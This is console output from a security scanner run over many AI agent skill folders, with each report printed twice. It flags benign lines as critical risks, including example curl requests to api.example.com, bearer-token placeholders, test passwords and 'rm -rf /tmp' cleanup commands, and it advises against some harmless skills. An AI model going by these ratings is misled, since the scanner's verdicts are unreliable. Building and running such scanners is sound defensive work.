Scanning: abstract-domain-explorer

[*] Scanning Skill: abstract-domain-explorer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/abstract-domain-explorer.html
Scanning: abstract-domain-explorer

[*] Scanning Skill: abstract-domain-explorer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/abstract-domain-explorer.json
Scanning: abstract-invariant-generator

[*] Scanning Skill: abstract-invariant-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/abstract-invariant-generator.html
Scanning: abstract-invariant-generator

[*] Scanning Skill: abstract-invariant-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/abstract-invariant-generator.json
Scanning: abstract-state-analyzer

[*] Scanning Skill: abstract-state-analyzer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/abstract-state-analyzer.html
Scanning: abstract-state-analyzer

[*] Scanning Skill: abstract-state-analyzer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/abstract-state-analyzer.json
Scanning: abstract-trace-summarizer

[*] Scanning Skill: abstract-trace-summarizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/abstract-trace-summarizer.html
Scanning: abstract-trace-summarizer

[*] Scanning Skill: abstract-trace-summarizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/abstract-trace-summarizer.json
Scanning: acsl-annotation-assistant

[*] Scanning Skill: acsl-annotation-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/acsl-annotation-assistant.html
Scanning: acsl-annotation-assistant

[*] Scanning Skill: acsl-annotation-assistant

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/acsl-annotation-assistant.json
Scanning: ambiguity-detector

[*] Scanning Skill: ambiguity-detector

[OK] Risk Level: SAFE (1.7/10)

[!] CRITICAL Issues (4):
  [FILE001] in ambiguity-detector/references/ambiguity_patterns.md:125
    Pattern: ✅ Clear: "Validate email format, password strength (min 8 chars, 1 number, 1 ...
    Confidence: MEDIUM
  [FILE001] in ambiguity-detector/references/ambiguity_patterns.md:312
    Pattern: ❌ Ambiguous: "Send a password reset email"
    Confidence: MEDIUM
  [FILE001] in ambiguity-detector/references/ambiguity_patterns.md:315
    Pattern: ✅ Clear: "Send password reset email to user's registered email address. Email...
    Confidence: MEDIUM
  [FILE001] in ambiguity-detector/references/ambiguity_patterns.md:325
    Pattern: ✅ Clear: "Process payments using Stripe API v2023-10-16. Support Visa, Master...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 4
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 4

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/ambiguity-detector.html
Scanning: ambiguity-detector

[*] Scanning Skill: ambiguity-detector

[OK] Risk Level: SAFE (1.7/10)

[!] CRITICAL Issues (4):
  [FILE001] in ambiguity-detector/references/ambiguity_patterns.md:125
    Pattern: ✅ Clear: "Validate email format, password strength (min 8 chars, 1 number, 1 ...
    Confidence: MEDIUM
  [FILE001] in ambiguity-detector/references/ambiguity_patterns.md:312
    Pattern: ❌ Ambiguous: "Send a password reset email"
    Confidence: MEDIUM
  [FILE001] in ambiguity-detector/references/ambiguity_patterns.md:315
    Pattern: ✅ Clear: "Send password reset email to user's registered email address. Email...
    Confidence: MEDIUM
  [FILE001] in ambiguity-detector/references/ambiguity_patterns.md:325
    Pattern: ✅ Clear: "Process payments using Stripe API v2023-10-16. Support Visa, Master...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 4
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 4

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/ambiguity-detector.json
Scanning: api-design-assistant

[*] Scanning Skill: api-design-assistant

[?] Risk Level: MEDIUM (5.5/10)

[!] CRITICAL Issues (13):
  [FILE001] in api-design-assistant/SKILL.md:73
    Pattern: - Authentication (Bearer tokens, API keys)
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/SKILL.md:125
    Pattern: - **Authentication**: Bearer tokens, API keys, OAuth2
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/SKILL.md:147
    Pattern: - `Authorization: Bearer <token>`
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/SKILL.md:243
    Pattern: - **Web/mobile apps**: JWT tokens
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/SKILL.md:245
    Pattern: - **Internal services**: mTLS or service tokens
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/references/best-practices.md:156
    Pattern: Authorization: Bearer <jwt-token>          # JWT tokens
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/references/best-practices.md:158
    Pattern: X-API-Key: <api-key>                      # API keys
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/references/openapi-template.md:407
    Pattern: ### Bearer Token (JWT)
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/references/openapi-template.md:415
    Pattern: description: JWT token authentication
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/references/openapi-template.md:422
    Pattern: apiKey:
    Confidence: MEDIUM
  and 3 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 13
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 13

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/api-design-assistant.html
Scanning: api-design-assistant

[*] Scanning Skill: api-design-assistant

[?] Risk Level: MEDIUM (5.5/10)

[!] CRITICAL Issues (13):
  [FILE001] in api-design-assistant/SKILL.md:73
    Pattern: - Authentication (Bearer tokens, API keys)
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/SKILL.md:125
    Pattern: - **Authentication**: Bearer tokens, API keys, OAuth2
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/SKILL.md:147
    Pattern: - `Authorization: Bearer <token>`
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/SKILL.md:243
    Pattern: - **Web/mobile apps**: JWT tokens
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/SKILL.md:245
    Pattern: - **Internal services**: mTLS or service tokens
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/references/best-practices.md:156
    Pattern: Authorization: Bearer <jwt-token>          # JWT tokens
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/references/best-practices.md:158
    Pattern: X-API-Key: <api-key>                      # API keys
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/references/openapi-template.md:407
    Pattern: ### Bearer Token (JWT)
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/references/openapi-template.md:415
    Pattern: description: JWT token authentication
    Confidence: MEDIUM
  [FILE001] in api-design-assistant/references/openapi-template.md:422
    Pattern: apiKey:
    Confidence: MEDIUM
  and 3 more

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 13
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 13

[*] Recommendation: REVIEW NEEDED - 请人工审查后使用

Report saved to: report/api-design-assistant.json
Scanning: api-documentation-generator

[*] Scanning Skill: api-documentation-generator

[!] Risk Level: CRITICAL (9.4/10)

[!] CRITICAL Issues (23):
  [NET001] in api-documentation-generator/SKILL.md:250
    Pattern: curl -X POST "https://api.example.com/v1/users" \
    Confidence: MEDIUM
  [NET001] in api-documentation-generator/SKILL.md:262
    Pattern: response = requests.post(
    Confidence: MEDIUM
  [NET001] in api-documentation-generator/SKILL.md:350
    Pattern: curl -X POST "https://api.example.com/v1/users" \
    Confidence: MEDIUM
  [NET001] in api-documentation-generator/SKILL.md:360
    Pattern: response = requests.post(
    Confidence: MEDIUM
  [NET001] in api-documentation-generator/SKILL.md:373
    Pattern: response = requests.get(
    Confidence: MEDIUM
  [FILE001] in api-documentation-generator/SKILL.md:155
    Pattern: [Describe auth method: Bearer tokens, API keys, OAuth2]
    Confidence: MEDIUM
  [FILE001] in api-documentation-generator/SKILL.md:198
    Pattern: - `Authorization: Bearer YOUR_TOKEN`
    Confidence: MEDIUM
  [FILE001] in api-documentation-generator/SKILL.md:252
    Pattern: -H "Authorization: Bearer YOUR_TOKEN" \
    Confidence: MEDIUM
  [FILE001] in api-documentation-generator/SKILL.md:264
    Pattern: headers={"Authorization": "Bearer YOUR_TOKEN"},
    Confidence: MEDIUM
  [FILE001] in api-documentation-generator/SKILL.md:352
    Pattern: -H "Authorization: Bearer YOUR_TOKEN" \
    Confidence: MEDIUM
  and 13 more

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 23
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 23

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/api-documentation-generator.html
Scanning: api-documentation-generator

[*] Scanning Skill: api-documentation-generator

[!] Risk Level: CRITICAL (9.4/10)

[!] CRITICAL Issues (23):
  [NET001] in api-documentation-generator/SKILL.md:250
    Pattern: curl -X POST "https://api.example.com/v1/users" \
    Confidence: MEDIUM
  [NET001] in api-documentation-generator/SKILL.md:262
    Pattern: response = requests.post(
    Confidence: MEDIUM
  [NET001] in api-documentation-generator/SKILL.md:350
    Pattern: curl -X POST "https://api.example.com/v1/users" \
    Confidence: MEDIUM
  [NET001] in api-documentation-generator/SKILL.md:360
    Pattern: response = requests.post(
    Confidence: MEDIUM
  [NET001] in api-documentation-generator/SKILL.md:373
    Pattern: response = requests.get(
    Confidence: MEDIUM
  [FILE001] in api-documentation-generator/SKILL.md:155
    Pattern: [Describe auth method: Bearer tokens, API keys, OAuth2]
    Confidence: MEDIUM
  [FILE001] in api-documentation-generator/SKILL.md:198
    Pattern: - `Authorization: Bearer YOUR_TOKEN`
    Confidence: MEDIUM
  [FILE001] in api-documentation-generator/SKILL.md:252
    Pattern: -H "Authorization: Bearer YOUR_TOKEN" \
    Confidence: MEDIUM
  [FILE001] in api-documentation-generator/SKILL.md:264
    Pattern: headers={"Authorization": "Bearer YOUR_TOKEN"},
    Confidence: MEDIUM
  [FILE001] in api-documentation-generator/SKILL.md:352
    Pattern: -H "Authorization: Bearer YOUR_TOKEN" \
    Confidence: MEDIUM
  and 13 more

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 23
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 23

[*] Recommendation: DO NOT USE THIS SKILL - 检测到严重安全风险

Report saved to: report/api-documentation-generator.json
Scanning: assertion-synthesizer

[*] Scanning Skill: assertion-synthesizer

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in assertion-synthesizer/SKILL.md:339
    Pattern: user = register_user("alice@example.com", "password123")
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/assertion-synthesizer.html
Scanning: assertion-synthesizer

[*] Scanning Skill: assertion-synthesizer

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in assertion-synthesizer/SKILL.md:339
    Pattern: user = register_user("alice@example.com", "password123")
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/assertion-synthesizer.json
Scanning: behavior-preservation-checker

[*] Scanning Skill: behavior-preservation-checker

[?] Risk Level: LOW (2.2/10)

[!] CRITICAL Issues (6):
  [NET001] in behavior-preservation-checker/references/comparison_techniques.md:177
    Pattern: orig_resp = requests.get(f"{original_url}{endpoint}")
    Confidence: MEDIUM
  [NET001] in behavior-preservation-checker/references/comparison_techniques.md:178
    Pattern: mig_resp = requests.get(f"{migrated_url}{endpoint}")
    Confidence: MEDIUM
  [NET001] in behavior-preservation-checker/references/difference_patterns.md:547
    Pattern: response = requests.get(url, timeout=30)
    Confidence: MEDIUM
  [NET001] in behavior-preservation-checker/references/difference_patterns.md:550
    Pattern: response = requests.get(url)  # No timeout!
    Confidence: LOW
  [FILE001] in behavior-preservation-checker/scripts/compare_test_results.py:82
    Pattern: all_tests = set(original_tests.keys()) | set(migrated_tests.keys())
    Confidence: MEDIUM
  [FILE001] in behavior-preservation-checker/scripts/behavior_checker.py:90
    Pattern: all_test_names = set(original_tests.keys()) | set(migrated_tests.keys())
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 7
  Critical Issues: 6
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/behavior-preservation-checker.html
Scanning: behavior-preservation-checker

[*] Scanning Skill: behavior-preservation-checker

[?] Risk Level: LOW (2.2/10)

[!] CRITICAL Issues (6):
  [NET001] in behavior-preservation-checker/references/comparison_techniques.md:177
    Pattern: orig_resp = requests.get(f"{original_url}{endpoint}")
    Confidence: MEDIUM
  [NET001] in behavior-preservation-checker/references/comparison_techniques.md:178
    Pattern: mig_resp = requests.get(f"{migrated_url}{endpoint}")
    Confidence: MEDIUM
  [NET001] in behavior-preservation-checker/references/difference_patterns.md:547
    Pattern: response = requests.get(url, timeout=30)
    Confidence: MEDIUM
  [NET001] in behavior-preservation-checker/references/difference_patterns.md:550
    Pattern: response = requests.get(url)  # No timeout!
    Confidence: LOW
  [FILE001] in behavior-preservation-checker/scripts/compare_test_results.py:82
    Pattern: all_tests = set(original_tests.keys()) | set(migrated_tests.keys())
    Confidence: MEDIUM
  [FILE001] in behavior-preservation-checker/scripts/behavior_checker.py:90
    Pattern: all_test_names = set(original_tests.keys()) | set(migrated_tests.keys())
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 7
  Critical Issues: 6
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 6

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/behavior-preservation-checker.json
Scanning: behavioral-mutation-analyzer

[*] Scanning Skill: behavioral-mutation-analyzer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/behavioral-mutation-analyzer.html
Scanning: behavioral-mutation-analyzer

[*] Scanning Skill: behavioral-mutation-analyzer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/behavioral-mutation-analyzer.json
Scanning: bisect-aware-instrumentation

[*] Scanning Skill: bisect-aware-instrumentation

[!!] Risk Level: HIGH (6.0/10)

[!] CRITICAL Issues (13):
  [FILE002] in bisect-aware-instrumentation/SKILL.md:89
    Pattern: rm -rf /tmp/test_cache
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/SKILL.md:39
    Pattern: if ! make build 2>/dev/null; then
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/SKILL.md:89
    Pattern: rm -rf /tmp/test_cache
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/SKILL.md:228
    Pattern: if ! command -v node &> /dev/null; then
    Confidence: HIGH
  [FILE002] in bisect-aware-instrumentation/references/git_bisect_guide.md:296
    Pattern: rm -rf /tmp/cache
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/references/git_bisect_guide.md:296
    Pattern: rm -rf /tmp/cache
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/references/git_bisect_guide.md:309
    Pattern: if ! make build 2>/dev/null; then
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/references/exit_codes.md:69
    Pattern: if ! make build 2>/dev/null; then
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/references/exit_codes.md:75
    Pattern: if ! command -v pytest &> /dev/null; then
    Confidence: HIGH
  [FILE002] in bisect-aware-instrumentation/scripts/bisect_template.sh:99
    Pattern: rm -rf /tmp/test_cache_*
    Confidence: HIGH
  and 3 more

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 13
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 13

[*] Recommendation: NOT RECOMMENDED - 检测到高风险问题

Report saved to: report/bisect-aware-instrumentation.html
Scanning: bisect-aware-instrumentation

[*] Scanning Skill: bisect-aware-instrumentation

[!!] Risk Level: HIGH (6.0/10)

[!] CRITICAL Issues (13):
  [FILE002] in bisect-aware-instrumentation/SKILL.md:89
    Pattern: rm -rf /tmp/test_cache
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/SKILL.md:39
    Pattern: if ! make build 2>/dev/null; then
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/SKILL.md:89
    Pattern: rm -rf /tmp/test_cache
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/SKILL.md:228
    Pattern: if ! command -v node &> /dev/null; then
    Confidence: HIGH
  [FILE002] in bisect-aware-instrumentation/references/git_bisect_guide.md:296
    Pattern: rm -rf /tmp/cache
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/references/git_bisect_guide.md:296
    Pattern: rm -rf /tmp/cache
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/references/git_bisect_guide.md:309
    Pattern: if ! make build 2>/dev/null; then
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/references/exit_codes.md:69
    Pattern: if ! make build 2>/dev/null; then
    Confidence: HIGH
  [CMD001] in bisect-aware-instrumentation/references/exit_codes.md:75
    Pattern: if ! command -v pytest &> /dev/null; then
    Confidence: HIGH
  [FILE002] in bisect-aware-instrumentation/scripts/bisect_template.sh:99
    Pattern: rm -rf /tmp/test_cache_*
    Confidence: HIGH
  and 3 more

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 13
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 13

[*] Recommendation: NOT RECOMMENDED - 检测到高风险问题

Report saved to: report/bisect-aware-instrumentation.json
Scanning: bug-history-summarizer

[*] Scanning Skill: bug-history-summarizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/bug-history-summarizer.html
Scanning: bug-history-summarizer

[*] Scanning Skill: bug-history-summarizer

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/bug-history-summarizer.json
Scanning: bug-localization

[*] Scanning Skill: bug-localization

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in bug-localization/SKILL.md:106
    Pattern: 3. Password hashing mismatch
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/bug-localization.html
Scanning: bug-localization

[*] Scanning Skill: bug-localization

[OK] Risk Level: SAFE (0.4/10)

[!] CRITICAL Issues (1):
  [FILE001] in bug-localization/SKILL.md:106
    Pattern: 3. Password hashing mismatch
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 1
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/bug-localization.json
Scanning: bug-reproduction-test-generator

[*] Scanning Skill: bug-reproduction-test-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/bug-reproduction-test-generator.html
Scanning: bug-reproduction-test-generator

[*] Scanning Skill: bug-reproduction-test-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/bug-reproduction-test-generator.json
Scanning: bug-to-patch-generator

[*] Scanning Skill: bug-to-patch-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/bug-to-patch-generator.html
Scanning: bug-to-patch-generator

[*] Scanning Skill: bug-to-patch-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/bug-to-patch-generator.json
Scanning: build-ci-migration-assistant

[*] Scanning Skill: build-ci-migration-assistant

[?] Risk Level: LOW (2.2/10)

[!] CRITICAL Issues (5):
  [FILE001] in build-ci-migration-assistant/references/ci-platforms.md:103
    Pattern: API_KEY: ${{ secrets.API_KEY }}
    Confidence: MEDIUM
  [FILE001] in build-ci-migration-assistant/references/ci-platforms.md:346
    Pattern: POSTGRES_PASSWORD: password
    Confidence: MEDIUM
  [FILE001] in build-ci-migration-assistant/references/ci-platforms.md:363
    Pattern: POSTGRES_PASSWORD: password
    Confidence: MEDIUM
  [FILE001] in build-ci-migration-assistant/references/ci-platforms.md:413
    Pattern: API_KEY: ${{ secrets.API_KEY }}
    Confidence: MEDIUM
  [FILE001] in build-ci-migration-assistant/references/ci-platforms.md:419
    Pattern: API_KEY: $CI_API_KEY
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 5
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 5

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/build-ci-migration-assistant.html
Scanning: build-ci-migration-assistant

[*] Scanning Skill: build-ci-migration-assistant

[?] Risk Level: LOW (2.2/10)

[!] CRITICAL Issues (5):
  [FILE001] in build-ci-migration-assistant/references/ci-platforms.md:103
    Pattern: API_KEY: ${{ secrets.API_KEY }}
    Confidence: MEDIUM
  [FILE001] in build-ci-migration-assistant/references/ci-platforms.md:346
    Pattern: POSTGRES_PASSWORD: password
    Confidence: MEDIUM
  [FILE001] in build-ci-migration-assistant/references/ci-platforms.md:363
    Pattern: POSTGRES_PASSWORD: password
    Confidence: MEDIUM
  [FILE001] in build-ci-migration-assistant/references/ci-platforms.md:413
    Pattern: API_KEY: ${{ secrets.API_KEY }}
    Confidence: MEDIUM
  [FILE001] in build-ci-migration-assistant/references/ci-platforms.md:419
    Pattern: API_KEY: $CI_API_KEY
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 3
  Critical Issues: 5
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 5

[*] Recommendation: USE WITH CAUTION - 存在轻微风险

Report saved to: report/build-ci-migration-assistant.json
Scanning: c-cpp-to-lean4-translator

[*] Scanning Skill: c-cpp-to-lean4-translator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/c-cpp-to-lean4-translator.html
Scanning: c-cpp-to-lean4-translator

[*] Scanning Skill: c-cpp-to-lean4-translator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 2
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/c-cpp-to-lean4-translator.json
Scanning: cd-pipeline-generator

[*] Scanning Skill: cd-pipeline-generator

[OK] Risk Level: SAFE (1.1/10)

[!] CRITICAL Issues (3):
  [NET001] in cd-pipeline-generator/SKILL.md:88
    Pattern: run: curl -f https://$DEPLOYMENT_URL/health || exit 1
    Confidence: MEDIUM
  [FILE001] in cd-pipeline-generator/assets/deploy-azure.yml:52
    Pattern: #       --registry-password ${{ secrets.ACR_PASSWORD }}
    Confidence: MEDIUM
  [FILE001] in cd-pipeline-generator/assets/deploy-aws.yml:58
    Pattern: #     aws ecr get-login-password | docker login --username AWS --password-std...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/cd-pipeline-generator.html
Scanning: cd-pipeline-generator

[*] Scanning Skill: cd-pipeline-generator

[OK] Risk Level: SAFE (1.1/10)

[!] CRITICAL Issues (3):
  [NET001] in cd-pipeline-generator/SKILL.md:88
    Pattern: run: curl -f https://$DEPLOYMENT_URL/health || exit 1
    Confidence: MEDIUM
  [FILE001] in cd-pipeline-generator/assets/deploy-azure.yml:52
    Pattern: #       --registry-password ${{ secrets.ACR_PASSWORD }}
    Confidence: MEDIUM
  [FILE001] in cd-pipeline-generator/assets/deploy-aws.yml:58
    Pattern: #     aws ecr get-login-password | docker login --username AWS --password-std...
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 4
  Critical Issues: 3
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 3

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/cd-pipeline-generator.json
Scanning: change-log-generator

[*] Scanning Skill: change-log-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/change-log-generator.html
Scanning: change-log-generator

[*] Scanning Skill: change-log-generator

[OK] Risk Level: SAFE (0.0/10)

[*] Summary:
  Total Files Scanned: 1
  Critical Issues: 0
  Warning Issues: 0
  Info Issues: 0
  Total Issues: 0

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/change-log-generator.json
Scanning: ci-pipeline-synthesizer

[*] Scanning Skill: ci-pipeline-synthesizer

[OK] Risk Level: SAFE (0.1/10)

[*] WARNING Issues (1):
  [DEP002] in ci-pipeline-synthesizer/assets/github-actions-python.yml:29
    Pattern: python -m pip install --upgrade pip
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 1
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/ci-pipeline-synthesizer.html
Scanning: ci-pipeline-synthesizer

[*] Scanning Skill: ci-pipeline-synthesizer

[OK] Risk Level: SAFE (0.1/10)

[*] WARNING Issues (1):
  [DEP002] in ci-pipeline-synthesizer/assets/github-actions-python.yml:29
    Pattern: python -m pip install --upgrade pip
    Confidence: MEDIUM

[*] Summary:
  Total Files Scanned: 5
  Critical Issues: 0
  Warning Issues: 1
  Info Issues: 0
  Total Issues: 1

[*] Recommendation: SAFE - 未检测到明显安全问题

Report saved to: report/ci-pipeline-synthesizer.json
Scanning: code-change-summarizer

[*] Scanning Skill: code-change-summarizer

[!!] Risk Level: HIGH (7.7/10)

[!] CRITICAL Issues (17):
  [FILE001] in code-change-summarizer/SKILL.md:105
    Pattern: - User model to include OAuth tokens
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:111
    Pattern: - Memory leak in token refresh
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:160
    Pattern: 3. Handle new response format with OAuth tokens
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:165
    Pattern: { "username": "user", "password": "pass" }
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:171
    Pattern: { "username": "user", "password": "pass", "provider": "google" }
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:199
    Pattern: manages token exchange and refresh.
    Confidence: MEDIUM
  [FILE001] in code-change-summarizer/SKILL.md:206
    Pattern: - **Token storage:** Store refresh tokens in secure HTTP-only cookies
